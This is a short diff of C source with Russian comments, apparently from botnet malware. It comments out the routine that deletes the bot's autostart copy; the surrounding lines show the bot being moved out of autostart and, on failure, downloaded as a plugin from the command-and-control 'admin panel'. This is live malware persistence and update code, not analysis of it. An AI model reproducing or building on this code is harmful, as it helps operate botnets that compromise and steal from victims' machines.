@@ -397,11 +397,13 @@ static bool SavedBot()
 		PP_DPRINTF( "SavedBot: переносим бот из автозагрузки" );
 		dataBot = 0;//File::ReadToBufferA( path, sizeBot );
 		//удаляем
+		/*
 		pSetFileAttributesA( path, FILE_ATTRIBUTE_NORMAL ); //убираем атрибут для чтения
 		if( pDeleteFileA(path) == 0 ) //если не удалился, то делаем чтобы после ребута удалился
 		{
 			pMoveFileExA( path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
 		}
+		*/
 	}
 	STR::Free(path);
 	if( !dataBot ) //из автозагрузки не удалось перенести, качаем с админки бот плаг
